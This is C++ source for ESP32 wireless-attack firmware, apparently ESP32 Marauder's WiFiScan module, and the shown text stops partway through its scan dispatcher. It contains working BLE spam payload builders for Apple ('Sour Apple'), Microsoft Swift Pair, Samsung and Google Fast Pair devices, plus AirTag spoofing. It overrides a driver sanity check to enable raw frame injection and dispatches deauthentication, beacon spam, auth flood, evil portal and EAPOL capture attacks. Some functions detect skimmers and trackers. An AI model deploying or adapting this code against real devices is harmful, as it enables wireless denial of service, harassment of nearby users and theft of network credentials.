#include "esp_random.h"
#include "WiFiScan.h"
#include "lang_var.h"

#ifdef HAS_PSRAM
  struct mac_addr* mac_history = nullptr;
#endif

int num_beacon = 0;
int num_deauth = 0;
int num_probe = 0;
int num_eapol = 0;

LinkedList<ssid>* ssids;
LinkedList<AccessPoint>* access_points;
LinkedList<Station>* stations;
LinkedList<AirTag>* airtags;
LinkedList<Flipper>* flippers;
LinkedList<IPAddress>* ipList;
LinkedList<ProbeReqSsid>* probe_req_ssids;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    if (arg == 31337)
      return 1;
    else
      return 0;
}

extern "C" {
  uint8_t esp_base_mac_addr[6];
  esp_err_t esp_ble_gap_set_rand_addr(const uint8_t *rand_addr);
}

#ifdef HAS_BT
  //ESP32 Sour Apple by RapierXbox
  //Exploit by ECTO-1A
  NimBLEAdvertising *pAdvertising;

  //// https://github.com/Spooks4576
  NimBLEAdvertisementData WiFiScan::GetUniversalAdvertisementData(EBLEPayloadType Type) {
    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();

    uint8_t* AdvData_Raw = nullptr;
    uint8_t i = 0;

    switch (Type) {
      case Microsoft: {
        
        const char* Name = generateRandomName();

        uint8_t name_len = strlen(Name);

        AdvData_Raw = new uint8_t[7 + name_len];

        AdvData_Raw[i++] = 7 + name_len - 1;
        AdvData_Raw[i++] = 0xFF;
        AdvData_Raw[i++] = 0x06;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x03;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x80;
        memcpy(&AdvData_Raw[i], Name, name_len);
        i += name_len;

        AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
        break;
      }
      case Apple: {
        AdvData_Raw = new uint8_t[17];

        AdvData_Raw[i++] = 17 - 1;    // Packet Length
        AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
        AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
        AdvData_Raw[i++] = 0x00;        // ...
        AdvData_Raw[i++] = 0x0F;  // Type
        AdvData_Raw[i++] = 0x05;                        // Length
        AdvData_Raw[i++] = 0xC1;                        // Action Flags
        const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
        AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
        esp_fill_random(&AdvData_Raw[i], 3); // Authentication Tag
        i += 3;   
        AdvData_Raw[i++] = 0x00;  // ???
        AdvData_Raw[i++] = 0x00;  // ???
        AdvData_Raw[i++] =  0x10;  // Type ???
        esp_fill_random(&AdvData_Raw[i], 3);

        AdvData.addData(std::string((char *)AdvData_Raw, 17));
        break;
      }
      case Samsung: {

        AdvData_Raw = new uint8_t[15];

        uint8_t model = watch_models[rand() % 25].value;
        
        AdvData_Raw[i++] = 14; // Size
        AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
        AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
        AdvData_Raw[i++] = 0x00; // ...
        AdvData_Raw[i++] = 0x01;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x02;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x01;
        AdvData_Raw[i++] = 0x01;
        AdvData_Raw[i++] = 0xFF;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x43;
        AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)

        AdvData.addData(std::string((char *)AdvData_Raw, 15));

        break;
      }
      case Google: {
        AdvData_Raw = new uint8_t[14];
        AdvData_Raw[i++] = 3;
        AdvData_Raw[i++] = 0x03;
        AdvData_Raw[i++] = 0x2C; // Fast Pair ID
        AdvData_Raw[i++] = 0xFE;

        AdvData_Raw[i++] = 6;
        AdvData_Raw[i++] = 0x16;
        AdvData_Raw[i++] = 0x2C; // Fast Pair ID
        AdvData_Raw[i++] = 0xFE;
        AdvData_Raw[i++] = 0x00; // Smart Controller Model ID
        AdvData_Raw[i++] = 0xB7;
        AdvData_Raw[i++] = 0x27;

        AdvData_Raw[i++] = 2;
        AdvData_Raw[i++] = 0x0A;
        AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm

        AdvData.addData(std::string((char *)AdvData_Raw, 14));
        break;
      }
      case FlipperZero: {
        // Generate a random 5-letter name for the advertisement
        char Name[6];  // 5 characters + null terminator
        generateRandomName(Name, sizeof(Name));

        uint8_t name_len = strlen(Name);

        // Allocate space for the full Advertisement Data section based on the hex dump
        AdvData_Raw = new uint8_t[31];  // Adjusted to the specific length of the data in the dump

        // Advertisement Data from the hex dump
        AdvData_Raw[i++] = 0x02;  // Flags length
        AdvData_Raw[i++] = 0x01;  // Flags type
        AdvData_Raw[i++] = 0x06;  // Flags value

        AdvData_Raw[i++] = 0x06;  // Name length (5 + type)
        AdvData_Raw[i++] = 0x09;  // Complete Local Name type

        // Add the randomized 5-letter name
        memcpy(&AdvData_Raw[i], Name, name_len);
        i += name_len;

        AdvData_Raw[i++] = 0x03;  // Incomplete List of 16-bit Service UUIDs length
        AdvData_Raw[i++] = 0x02;  // Incomplete List of 16-bit Service UUIDs type
        AdvData_Raw[i++] = 0x80 + (rand() % 3) + 1;   // Service UUID (part of hex dump)
        AdvData_Raw[i++] = 0x30;

        AdvData_Raw[i++] = 0x02;  // TX Power level length
        AdvData_Raw[i++] = 0x0A;  // TX Power level type
        AdvData_Raw[i++] = 0x00;  // TX Power level value

        // Manufacturer specific data based on your hex dump
        AdvData_Raw[i++] = 0x05;  // Length of Manufacturer Specific Data section
        AdvData_Raw[i++] = 0xFF;  // Manufacturer Specific Data type
        AdvData_Raw[i++] = 0xBA;  // LSB of Manufacturer ID (Flipper Zero: 0x0FBA)
        AdvData_Raw[i++] = 0x0F;  // MSB of Manufacturer ID

        AdvData_Raw[i++] = 0x4C;  // Example data (remaining as in your dump)
        AdvData_Raw[i++] = 0x75;
        AdvData_Raw[i++] = 0x67;
        AdvData_Raw[i++] = 0x26;
        AdvData_Raw[i++] = 0xE1;
        AdvData_Raw[i++] = 0x80;

        // Add the constructed Advertisement Data to the BLE advertisement
        AdvData.addData(std::string((char *)AdvData_Raw, i));

        break;
      }

      case Airtag: {
        for (int i = 0; i < airtags->size(); i++) {
          if (airtags->get(i).selected) {
            AdvData.addData(std::string((char*)airtags->get(i).payload.data(), airtags->get(i).payloadSize));

            break;
          }
        }

        break;
      }
      default: {
        Serial.println("Please Provide a Company Type");
        break;
      }
    }

    delete[] AdvData_Raw;

    return AdvData;
  }
  //// https://github.com/Spooks4576


  class bluetoothScanAllCallback: public NimBLEAdvertisedDeviceCallbacks {
  
      void onResult(NimBLEAdvertisedDevice *advertisedDevice) {

        extern WiFiScan wifi_scan_obj;
  
        //#ifdef HAS_SCREEN
        //  int buf = display_obj.display_buffer->size();
        //#else
        int buf = 0;
        //#endif
          
        String display_string = "";

        if (wifi_scan_obj.currentScanMode == BT_SCAN_AIRTAG) {
          uint8_t* payLoad = advertisedDevice->getPayload();
          size_t len = advertisedDevice->getPayloadLength();

          bool match = false;
          for (int i = 0; i <= len - 4; i++) {
            if (payLoad[i] == 0x1E && payLoad[i+1] == 0xFF && payLoad[i+2] == 0x4C && payLoad[i+3] == 0x00) {
              match = true;
              break;
            }
            if (payLoad[i] == 0x4C && payLoad[i+1] == 0x00 && payLoad[i+2] == 0x12 && payLoad[i+3] == 0x19) {
              match = true;
              break;
            }
          }

          if (match) {
            String mac = advertisedDevice->getAddress().toString().c_str();
            mac.toUpperCase();

            for (int i = 0; i < airtags->size(); i++) {
              if (mac == airtags->get(i).mac)
                return;
            }

            int rssi = advertisedDevice->getRSSI();
            Serial.print("RSSI: ");
            Serial.print(rssi);
            Serial.print(" MAC: ");
            Serial.println(mac);
            Serial.print("Len: ");
            Serial.print(len);
            Serial.print(" Payload: ");
            for (size_t i = 0; i < len; i++) {
              Serial.printf("%02X ", payLoad[i]);
            }
            Serial.println("\n");

            AirTag airtag;
            airtag.mac = mac;
            airtag.payload.assign(payLoad, payLoad + len);
            airtag.payloadSize = len;

            airtags->add(airtag);


            #ifdef HAS_SCREEN
              //display_string.concat("RSSI: ");
              display_string.concat((String)rssi);
              display_string.concat(" MAC: ");
              display_string.concat(mac);
              uint8_t temp_len = display_string.length();
              for (uint8_t i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
              display_obj.display_buffer->add(display_string);
            #endif
          }
        }
        else if (wifi_scan_obj.currentScanMode == BT_SCAN_FLIPPER) {
          uint8_t* payLoad = advertisedDevice->getPayload();
          size_t len = advertisedDevice->getPayloadLength();

          bool match = false;
          String color = "";
          for (int i = 0; i <= len - 4; i++) {
            if (payLoad[i] == 0x81 && payLoad[i+1] == 0x30) {
              match = true;
              color = "Black";
              break;
            }
            if (payLoad[i] == 0x82 && payLoad[i+1] == 0x30) {
              match = true;
              color = "White";
              break;
            }
            if (payLoad[i] == 0x83 && payLoad[i+1] == 0x30) {
              color = "Transparent";
              match = true;
              break;
            }
          }

          if (match) {
            String mac = advertisedDevice->getAddress().toString().c_str();
            String name = advertisedDevice->getName().c_str();
            mac.toUpperCase();

            for (int i = 0; i < flippers->size(); i++) {
              if (mac == flippers->get(i).mac)
                return;
            }

            int rssi = advertisedDevice->getRSSI();
            Serial.print("RSSI: ");
            Serial.print(rssi);
            Serial.print(" MAC: ");
            Serial.println(mac);
            Serial.print("Name: ");
            Serial.println(name);

            Flipper flipper;
            flipper.mac = mac;
            flipper.name = name;

            flippers->add(flipper);


            /*#ifdef HAS_SCREEN
              //display_string.concat("RSSI: ");
              display_string.concat((String)rssi);
              display_string.concat(" Flipper: ");
              display_string.concat(name);
              uint8_t temp_len = display_string.length();
              for (uint8_t i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
              display_obj.display_buffer->add(display_string);
            #endif*/

            #ifdef HAS_SCREEN
              display_obj.display_buffer->add(String("Flipper: ") + name + ",                 ");
              display_obj.display_buffer->add("       MAC: " + String(mac) + ",             ");
              display_obj.display_buffer->add("      RSSI: " + String(rssi) + ",               ");
              display_obj.display_buffer->add("     Color: " + String(color) + "                ");
            #endif
          }
        }
        else if (wifi_scan_obj.currentScanMode == BT_SCAN_ALL) {
          if (buf >= 0)
          {
            display_string.concat(text_table4[0]);
            display_string.concat(advertisedDevice->getRSSI());
            Serial.print(" RSSI: ");
            Serial.print(advertisedDevice->getRSSI());
    
            display_string.concat(" ");
            Serial.print(" ");
            
            Serial.print("Device: ");
            if(advertisedDevice->getName().length() != 0)
            {
              display_string.concat(advertisedDevice->getName().c_str());
              Serial.print(advertisedDevice->getName().c_str());
              
            }
            else
            {
              display_string.concat(advertisedDevice->getAddress().toString().c_str());
              Serial.print(advertisedDevice->getAddress().toString().c_str());
            }
    
            #ifdef HAS_SCREEN
              uint8_t temp_len = display_string.length();
              for (uint8_t i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
      
              Serial.println();
      
              while (display_obj.printing)
                delay(1);
              display_obj.loading = true;
              display_obj.display_buffer->add(display_string);
              display_obj.loading = false;
            #endif
          }
        }
        else if ((wifi_scan_obj.currentScanMode == BT_SCAN_WAR_DRIVE)  || (wifi_scan_obj.currentScanMode == BT_SCAN_WAR_DRIVE_CONT)) {
          #ifdef HAS_GPS
            if (gps_obj.getGpsModuleStatus()) {
              bool do_save = false;
              if (buf >= 0)
              {                
                Serial.print("Device: ");
                if(advertisedDevice->getName().length() != 0)
                {
                  display_string.concat(advertisedDevice->getName().c_str());
                  Serial.print(advertisedDevice->getName().c_str());
                  
                }
                else
                {
                  display_string.concat(advertisedDevice->getAddress().toString().c_str());
                  Serial.print(advertisedDevice->getAddress().toString().c_str());
                }

                if (gps_obj.getFixStatus()) {
                  do_save = true;
                  display_string.concat(" | Lt: " + gps_obj.getLat());
                  display_string.concat(" | Ln: " + gps_obj.getLon());
                }
                else {
                  display_string.concat(" | GPS: No Fix");
                }
        
                #ifdef HAS_SCREEN
                  uint8_t temp_len = display_string.length();
                  for (uint8_t i = 0; i < 40 - temp_len; i++)
                  {
                    display_string.concat(" ");
                  }
          
                  Serial.println();
          
                  while (display_obj.printing)
                    delay(1);
                  display_obj.loading = true;
                  display_obj.display_buffer->add(display_string);
                  display_obj.loading = false;
                #endif

                String wardrive_line = (String)advertisedDevice->getAddress().toString().c_str() + ",,[BLE]," + gps_obj.getDatetime() + ",0," + (String)advertisedDevice->getRSSI() + "," + gps_obj.getLat() + "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," + gps_obj.getAccuracy() + ",BLE\n";
                Serial.print(wardrive_line);

                if (do_save)
                  buffer_obj.append(wardrive_line);
              }
            }
          #endif
        }
        else if (wifi_scan_obj.currentScanMode == BT_SCAN_ANALYZER) {
          wifi_scan_obj._analyzer_value++;

          if (wifi_scan_obj.analyzer_frames_recvd < 254)
            wifi_scan_obj.analyzer_frames_recvd++;

          if (wifi_scan_obj.analyzer_frames_recvd > ANALYZER_NAME_REFRESH) {
            display_string.concat(advertisedDevice->getRSSI());
            display_string.concat(" ");

            if(advertisedDevice->getName().length() != 0)
              display_string.concat(advertisedDevice->getName().c_str());
            else
              display_string.concat(advertisedDevice->getAddress().toString().c_str());

            wifi_scan_obj.analyzer_frames_recvd = 0;
            wifi_scan_obj.analyzer_name_string = display_string;
            wifi_scan_obj.analyzer_name_update = true;
          }
        }
      }
  };
  
  class bluetoothScanSkimmersCallback: public BLEAdvertisedDeviceCallbacks {
      void onResult(BLEAdvertisedDevice *advertisedDevice) {
        String bad_list[bad_list_length] = {"HC-03", "HC-05", "HC-06"};
  
        #ifdef HAS_SCREEN
          int buf = display_obj.display_buffer->size();
        #else
          int buf = 0;
        #endif
          
        if (buf >= 0)
        {
          Serial.print("Device: ");
          String display_string = "";
          if(advertisedDevice->getName().length() != 0)
          {
            Serial.print(advertisedDevice->getName().c_str());
            for(uint8_t i = 0; i < bad_list_length; i++)
            {
              #ifdef HAS_SCREEN
                if(strcmp(advertisedDevice->getName().c_str(), bad_list[i].c_str()) == 0)
                {
                  display_string.concat(text_table4[1]);
                  display_string.concat(" ");
                  display_string.concat(advertisedDevice->getName().c_str());
                  uint8_t temp_len = display_string.length();
                  for (uint8_t i = 0; i < 40 - temp_len; i++)
                  {
                    display_string.concat(" ");
                  }
                  while (display_obj.printing)
                    delay(1);
                  display_obj.loading = true;
                  display_obj.display_buffer->add(display_string);
                  display_obj.loading = false;
                }
              #endif
            }
          }
          else
          {
            Serial.print(advertisedDevice->getAddress().toString().c_str());
          }
          Serial.print(" RSSI: ");
          Serial.println(advertisedDevice->getRSSI());
        }
      }
  };
#endif


WiFiScan::WiFiScan()
{
}

/*String WiFiScan::macToString(const Station& station) {
  char macStr[18]; // 6 pairs of hex digits + 5 colons + null terminator
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           station.mac[0], station.mac[1], station.mac[2],
           station.mac[3], station.mac[4], station.mac[5]);
  return String(macStr);
}*/

void WiFiScan::RunSetup() {
  if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1)
    this->wsl_bypass_enabled = true;
  else
    this->wsl_bypass_enabled = false;

  #ifdef HAS_PSRAM
    ssids = new (ps_malloc(sizeof(LinkedList<ssid>))) LinkedList<ssid>();
    new (ssids) LinkedList<ssid>();
  #else
    ssids = new LinkedList<ssid>();
  #endif
  access_points = new LinkedList<AccessPoint>();
  stations = new LinkedList<Station>();
  airtags = new LinkedList<AirTag>();
  flippers = new LinkedList<Flipper>();
  ipList = new LinkedList<IPAddress>();
  probe_req_ssids = new LinkedList<ProbeReqSsid>;
  // for Pinescan
  pinescan_trackers = new LinkedList<PineScanTracker>();
  confirmed_pinescan = new LinkedList<ConfirmedPineScan>();
  pinescan_list_full_reported = false;
  // for MultiSSID
  multissid_trackers = new LinkedList<MultiSSIDTracker>();
  confirmed_multissid = new LinkedList<ConfirmedMultiSSID>();
  multissid_list_full_reported = false;

  #ifdef HAS_PSRAM
    mac_history = (struct mac_addr*) ps_malloc(mac_history_len * sizeof(struct mac_addr));
  #endif

  #ifdef HAS_BT
    watch_models = new WatchModel[26] {
      {0x1A, "Fallback Watch"},
      {0x01, "White Watch4 Classic 44m"},
      {0x02, "Black Watch4 Classic 40m"},
      {0x03, "White Watch4 Classic 40m"},
      {0x04, "Black Watch4 44mm"},
      {0x05, "Silver Watch4 44mm"},
      {0x06, "Green Watch4 44mm"},
      {0x07, "Black Watch4 40mm"},
      {0x08, "White Watch4 40mm"},
      {0x09, "Gold Watch4 40mm"},
      {0x0A, "French Watch4"},
      {0x0B, "French Watch4 Classic"},
      {0x0C, "Fox Watch5 44mm"},
      {0x11, "Black Watch5 44mm"},
      {0x12, "Sapphire Watch5 44mm"},
      {0x13, "Purpleish Watch5 40mm"},
      {0x14, "Gold Watch5 40mm"},
      {0x15, "Black Watch5 Pro 45mm"},
      {0x16, "Gray Watch5 Pro 45mm"},
      {0x17, "White Watch5 44mm"},
      {0x18, "White & Black Watch5"},
      {0x1B, "Black Watch6 Pink 40mm"},
      {0x1C, "Gold Watch6 Gold 40mm"},
      {0x1D, "Silver Watch6 Cyan 44mm"},
      {0x1E, "Black Watch6 Classic 43m"},
      {0x20, "Green Watch6 Classic 43m"},
    };
    
    NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
    NimBLEDevice::setScanDuplicateCacheSize(200);
    NimBLEDevice::init("");
    pBLEScan = NimBLEDevice::getScan(); //create new scan
    this->ble_initialized = true;
    
    this->shutdownBLE();
    esp_wifi_init(&cfg);
    #ifdef HAS_DUAL_BAND
      esp_wifi_set_country(&country);
    #endif
    esp_wifi_set_mode(WIFI_AP_STA);
    esp_wifi_start();
    this->wifi_initialized = true;
    esp_wifi_get_mac(WIFI_IF_STA, this->sta_mac);
    delay(10);
    esp_wifi_get_mac(WIFI_IF_AP, this->ap_mac);
    this->setMac();
    this->shutdownWiFi();
  #endif

  this->initWiFi(1);
}

bool WiFiScan::isHostAlive(IPAddress ip) {
  if (ip != IPAddress(0, 0, 0, 0))
    return Ping.ping(ip, 1);  // 1 try, returns true if reply received
  else
    return false;
}

int WiFiScan::clearStations() {
  int num_cleared = stations->size();
  stations->clear();
  Serial.println("stations: " + (String)stations->size());

  // Now clear stations list from APs
  for (int i = 0; i < access_points->size(); i++)
    access_points->get(i).stations->clear();
    
  return num_cleared;
}

bool WiFiScan::checkMem() {
  if (esp_get_free_heap_size() <= MEM_LOWER_LIM)
    return false;
  else
    return true;
}

int WiFiScan::clearAPs() {
  int num_cleared = access_points->size();
  while (access_points->size() > 0)
    access_points->remove(0);
  Serial.println("access_points: " + (String)access_points->size());
  return num_cleared;
}

int WiFiScan::clearIPs() {
  int num_cleared = ipList->size();
  while (ipList->size() > 0)
    ipList->remove(0);
  Serial.println("ipList: " + (String)ipList->size());
  return num_cleared;
}

int WiFiScan::clearAirtags() {
  int num_cleared = airtags->size();
  while (airtags->size() > 0)
    airtags->remove(0);
  Serial.println("airtags: " + (String)airtags->size());
  return num_cleared;
}

int WiFiScan::clearFlippers() {
  int num_cleared = flippers->size();
  while (flippers->size() > 0)
    flippers->remove(0);
  Serial.println("Flippers: " + (String)flippers->size());
  return num_cleared;
}

int WiFiScan::clearSSIDs() {
  int num_cleared = ssids->size();
  ssids->clear();
  Serial.println("ssids: " + (String)ssids->size());
  return num_cleared;
}

bool WiFiScan::addSSID(String essid) {
  ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
  ssids->add(s);
  Serial.println(ssids->get(ssids->size() - 1).essid);

  return true;
}

int WiFiScan::generateSSIDs(int count) {
  uint8_t num_gen = count;
  for (uint8_t x = 0; x < num_gen; x++) {
    String essid = "";

    for (uint8_t i = 0; i < 6; i++)
      essid.concat(alfa[random(65)]);

    ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
    ssids->add(s);
    Serial.println(ssids->get(ssids->size() - 1).essid);
  }

  Serial.print("Free Heap: ");
  Serial.print(esp_get_free_heap_size());
  #ifdef HAS_PSRAM
    Serial.print(" Free PSRAM: ");
    Serial.println(heap_caps_get_free_size(MALLOC_CAP_SPIRAM));
  #endif

  return num_gen;
}

bool WiFiScan::joinWiFi(String ssid, String password, bool gui)
{
  static const char * btns[] ={text16, ""};
  int count = 0;
  
  if ((WiFi.status() == WL_CONNECTED) && (ssid == connected_network) && (ssid != "")) {
    #ifdef HAS_TOUCH
      if (gui) {
        lv_obj_t * mbox1 = lv_msgbox_create(lv_scr_act(), NULL);
        lv_msgbox_set_text(mbox1, text_table4[2]);
        lv_msgbox_add_btns(mbox1, btns);
        lv_obj_set_width(mbox1, 200);
        lv_obj_align(mbox1, NULL, LV_ALIGN_CENTER, 0, 0); //Align to the corner
      }
    #endif
    this->wifi_initialized = true;
    this->currentScanMode = WIFI_CONNECTED;
    return true;
  }
  else if (WiFi.status() == WL_CONNECTED) {
    Serial.println("Already connected. Disconnecting...");
    WiFi.disconnect();
  }

  WiFi.disconnect(true);
  delay(100);
  WiFi.mode(WIFI_MODE_STA);

  //esp_wifi_set_mode(WIFI_IF_STA);

  this->setMac();
    
  WiFi.begin(ssid.c_str(), password.c_str());

  #ifdef HAS_SCREEN
    #ifdef HAS_MINI_KB
      if (gui) {
        display_obj.clearScreen();
        display_obj.tft.setCursor(0, TFT_HEIGHT / 2);
        display_obj.tft.setTextSize(1);
        display_obj.tft.print("Connecting");
        display_obj.tft.setTextWrap(true, false);
      }
    #endif
  #endif

  Serial.print("Connecting to WiFi");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
    #ifdef HAS_SCREEN
      #ifdef HAS_MINI_KB
        if (gui) {
          display_obj.tft.print(".");
        }
      #endif
    #endif
    count++;
    if (count == 20)
    {
      Serial.println("\nCould not connect to WiFi network");
      #ifdef HAS_SCREEN
        #ifdef HAS_MINI_KB
          if (gui) {
            display_obj.tft.println("\nFailed to connect");
            delay(1000);
          }
        #endif
      #endif
      #ifdef HAS_TOUCH
        if (gui) {
          lv_obj_t * mbox1 = lv_msgbox_create(lv_scr_act(), NULL);
          lv_msgbox_set_text(mbox1, text_table4[3]);
          lv_msgbox_add_btns(mbox1, btns);
          lv_obj_set_width(mbox1, 200);
          //lv_obj_set_event_cb(mbox1, event_handler);
          lv_obj_align(mbox1, NULL, LV_ALIGN_CENTER, 0, 0); //Align to the corner
        }
      #endif
      this->wifi_initialized = true;
      this->StartScan(WIFI_SCAN_OFF, TFT_BLACK);
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false, false);
      #endif
      return false;
    }
  }
  
  #ifdef HAS_TOUCH
    lv_obj_t * mbox1 = lv_msgbox_create(lv_scr_act(), NULL);
    lv_msgbox_set_text(mbox1, text_table4[4]);
    lv_msgbox_add_btns(mbox1, btns);
    lv_obj_set_width(mbox1, 200);
    lv_obj_align(mbox1, NULL, LV_ALIGN_CENTER, 0, 0); //Align to the corner
  #endif
  this->connected_network = ssid;
  this->ip_addr = WiFi.localIP();
  this->gateway = WiFi.gatewayIP();
  this->subnet = WiFi.subnetMask();
  
  Serial.println("\nConnected to the WiFi network");
  Serial.print("IP address: ");
  Serial.println(this->ip_addr);
  Serial.print("Gateway: ");
  Serial.println(this->gateway);
  Serial.print("Netmask: ");
  Serial.println(this->subnet);
  Serial.print("MAC: ");
  Serial.println(WiFi.macAddress());

  #ifdef HAS_SCREEN
    #ifdef HAS_MINI_KB
      display_obj.tft.println("\nConnected!");
      display_obj.tft.print("IP address: ");
      display_obj.tft.println(this->ip_addr);
      display_obj.tft.print("Gateway: ");
      display_obj.tft.println(this->gateway);
      display_obj.tft.print("Netmask: ");
      display_obj.tft.println(this->subnet);
      display_obj.tft.print("MAC: ");
      display_obj.tft.println(WiFi.macAddress());
      display_obj.tft.println("Returning...");
      delay(2000);
    #endif
  #endif
  this->wifi_initialized = true;
  #ifndef HAS_TOUCH
    this->currentScanMode = WIFI_CONNECTED;
    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false, false);
    #endif
  #endif
  return true;
}

// Apply WiFi settings
void WiFiScan::initWiFi(uint8_t scan_mode) {
  // Set the channel
  if (scan_mode != WIFI_SCAN_OFF) {
    //Serial.println(F("Initializing WiFi settings..."));
    this->changeChannel();
  
    this->force_pmkid = settings_obj.loadSetting<bool>(text_table4[5]);
    this->force_probe = settings_obj.loadSetting<bool>(text_table4[6]);
    this->save_pcap = settings_obj.loadSetting<bool>(text_table4[7]);
    this->ep_deauth = settings_obj.loadSetting<bool>("EPDeauth");
    //Serial.println(F("Initialization complete"));
  }
}

bool WiFiScan::scanning() {
  if (this->currentScanMode == WIFI_SCAN_OFF)
    return false;
  else
    return true;
}

// Function to prepare to run a specific scan
void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
{  
  this->initWiFi(scan_mode);
  if (scan_mode == WIFI_SCAN_OFF)
    StopScan(scan_mode);
  else if (scan_mode == WIFI_SCAN_PROBE)
    RunProbeScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_STATION_WAR_DRIVE)
    RunProbeScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_EVIL_PORTAL)
    RunEvilPortal(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_EAPOL)
    RunEapolScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_ACTIVE_EAPOL)
    RunEapolScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_ACTIVE_LIST_EAPOL)
    RunEapolScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_AP)
    RunBeaconScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_WAR_DRIVE)
    RunBeaconScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_SIG_STREN)
    RunRawScan(scan_mode, color);    
  else if (scan_mode == WIFI_SCAN_RAW_CAPTURE)
    RunRawScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_STATION)
    RunStationScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_TARGET_AP)
    RunAPScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_TARGET_AP_FULL)
    RunAPScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_AP_STA)
    RunAPScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_PWN)
    RunPwnScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_PINESCAN)
    RunPineScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_MULTISSID)
    RunMultiSSIDScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_DEAUTH)
    RunDeauthScan(scan_mode, color);
  else if (scan_mode == WIFI_PACKET_MONITOR) {
    #ifdef HAS_SCREEN
      RunPacketMonitor(scan_mode, color);
    #endif
  }
  else if ((scan_mode == WIFI_SCAN_CHAN_ANALYZER) ||
          (scan_mode == WIFI_SCAN_PACKET_RATE)) {
    //#ifdef HAS_SCREEN
      RunPacketMonitor(scan_mode, color);
    //#endif
  }
  else if (scan_mode == WIFI_ATTACK_BEACON_LIST)
    this->startWiFiAttacks(scan_mode, color, text_table1[50]);
  else if (scan_mode == WIFI_ATTACK_BEACON_SPAM)
    this->startWiFiAttacks(scan_mode, color, text_table1[51]);
  else if (scan_mode == WIFI_ATTACK_RICK_ROLL)
    this->startWiFiAttacks(scan_mode, color, text_table1[52]);
  else if (scan_mode == WIFI_ATTACK_AUTH)
    this->startWiFiAttacks(scan_mode, color, text_table1[53]);
  else if (scan_mode == WIFI_ATTACK_DEAUTH)
    this->startWiFiAttacks(scan_mode, color, text_table4[8]);
  else if (scan_mode == WIFI_ATTACK_DEAUTH_MANUAL)
    this->startWiFiAttacks(scan_mode, color, text_table4[8]);
  else if (scan_mode == WIFI_ATTACK_DEAUTH_TARGETED)
    this->startWiFiAttacks(scan_mode, color, text_table4[47]);
  else if (scan_mode == WIFI_ATTACK_BAD_MSG_TARGETED)
    this->startWiFiAttacks(scan_mode, color, "Bad Msg Targ");
  else if (scan_mode == WIFI_ATTACK_BAD_MSG)
    this->startWiFiAttacks(scan_mode, color, "Bad Msg");
  else if (scan_mode == WIFI_ATTACK_AP_SPAM)
    this->startWiFiAttacks(scan_mode, color, " AP Beacon Spam ");
  else if ((scan_mode == BT_SCAN_ALL) || (scan_mode == BT_SCAN_AIRTAG) || (scan_mode == BT_SCAN_FLIPPER) || (scan_mode == BT_SCAN_ANALYZER)){
    #ifdef HAS_BT
      RunBluetoothScan(scan_mode, color);
    #endif
  }
  else if (scan_mode == BT_ATTACK_SOUR_APPLE) {
    #ifdef HAS_BT
      RunSourApple(scan_mode, color);
    #endif
  }
  else if ((scan_mode == BT_ATTACK_SWIFTPAIR_SPAM) || 
           (scan_mode == BT_ATTACK_SPAM_ALL) ||
           (scan_mode == BT_ATTACK_SAMSUNG_SPAM) ||
           (scan_mode == BT_ATTACK_GOOGLE_SPAM) ||
           (scan_mode == BT_ATTACK_FLIPPER_SPAM) ||
           (scan_mode == BT_SPOOF_AIRTAG)) {
    #ifdef HAS_BT
      RunSwiftpairSpam(scan_mode, color);
    #endif
  }
  else if ((scan_mode == BT_SCAN_WAR_DRIVE) ||
           (scan_mode == BT_SCAN_WAR_DRIVE_CONT)) {
    #ifdef HAS_BT
      RunBluetoothScan(scan_mode, color);
    #endif
  }
  else if (scan_mode == BT_SCAN_SKIMMERS) {
    #ifdef HAS_BT
      RunBluetoothScan(scan_mode, color);
    #endif
  }
